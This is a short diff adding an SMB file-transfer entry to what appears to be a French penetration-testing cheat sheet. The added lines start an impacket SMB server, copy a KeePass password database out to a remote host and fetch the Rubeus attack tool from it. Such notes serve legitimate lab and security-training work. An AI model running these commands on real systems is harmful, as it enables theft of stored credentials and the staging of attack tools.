@@ -8,6 +8,13 @@ https://github.com/swisskyrepo/PayloadsAllTheThings
 
 ## Transfert / Tunneling
 
+**SMB**
+
+    impacket-smbserver smb dossier/ -smb2support -debug
+    ...
+    copy Passwords.kdbx \\192.168.50.100\smb\
+    copy \\192.168.50.100\smb\Rubeus.exe .\Rubeus.exe
+
 **Web (Apache)**
 
     sudo systemctl start apache2
